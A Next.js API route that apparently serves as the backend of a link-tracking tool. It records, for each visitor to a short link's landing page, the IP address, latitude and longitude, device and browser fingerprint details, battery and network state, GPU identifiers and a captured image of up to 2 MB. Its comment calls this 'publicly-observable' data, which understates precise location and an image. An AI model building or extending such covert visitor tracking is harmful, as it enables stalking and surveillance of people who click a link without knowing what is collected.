import { NextResponse } from "next/server";
import { addLog, getLinkByCode } from "@/lib/db";
import { lookupGeo } from "@/lib/geo";
import { asNumber, asString } from "@/lib/validate";
import type { TelemetryPayload } from "@/lib/types";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Telemetry sink used by the visitor landing page (/v/[code]).
 * Stores the publicly-observable device/browser signals the dashboard renders.
 */
export async function POST(req: Request) {
  let body: { code?: string; telemetry?: TelemetryPayload };
  try {
    body = (await req.json()) as { code?: string; telemetry?: TelemetryPayload };
  } catch {
    return NextResponse.json({ success: false, error: "Invalid JSON body" }, { status: 400 });
  }

  const code = asString(body.code, 40);
  if (!code) {
    return NextResponse.json({ success: false, error: "code is required." }, { status: 400 });
  }

  const link = await getLinkByCode(code);
  if (!link) {
    return NextResponse.json({ success: false, error: "Link not found." }, { status: 404 });
  }

  const geo = await lookupGeo(req);
  const t = body.telemetry || {};

  const log = await addLog({
    link_id: link.id,
    short_code: link.short_code,
    ip_address: asString(t.ipAddress, 60) || geo.ipAddress,
    location_name: asString(t.locationName, 120) || geo.locationName,
    latitude: asNumber(t.latitude),
    longitude: asNumber(t.longitude),
    device_type: asString(t.deviceType, 120) || null,
    device_model: asString(t.deviceModel, 120) || null,
    os: asString(t.os, 120) || null,
    os_version: asString(t.osVersion, 120) || null,
    browser: asString(t.browser, 120) || null,
    browser_version: asString(t.browserVersion, 40) || null,
    user_agent: asString(t.userAgent, 500) || null,
    raw_user_agent: asString(t.rawUserAgent, 500) || null,
    screen_resolution: asString(t.screenResolution, 40) || null,
    screen_color_depth: asNumber(t.screenColorDepth),
    timezone: asString(t.timezone, 80) || null,
    language: asString(t.language, 30) || null,
    hardware_concurrency: asNumber(t.hardwareConcurrency),
    device_memory: asNumber(t.deviceMemory),
    touch_points: asNumber(t.touchPoints),
    battery_level: asNumber(t.batteryLevel),
    is_charging: typeof t.isCharging === "boolean" ? t.isCharging : null,
    network_type: asString(t.networkType, 40) || null,
    gpu_chipset: asString(t.gpuChipset, 160) || null,
    webgl_vendor: asString(t.webglVendor, 200) || null,
    webgl_renderer: asString(t.webglRenderer, 200) || null,
    captured_image: asString(t.capturedImage, 2_000_000) || null,
  });

  return NextResponse.json({ success: true, id: log.id });
}
